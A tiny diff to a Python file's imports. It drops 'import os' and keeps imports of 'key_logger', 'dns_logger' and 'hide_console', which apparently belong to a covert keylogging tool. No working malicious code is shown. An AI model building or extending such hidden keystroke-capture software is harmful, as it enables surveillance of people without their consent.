@@ -1,6 +1,5 @@
 from utilities import dir_path, sync, server, hide_console 
 from logger import key_logger, dns_logger
-import os
 import sys
 import socket
 import multiprocessing
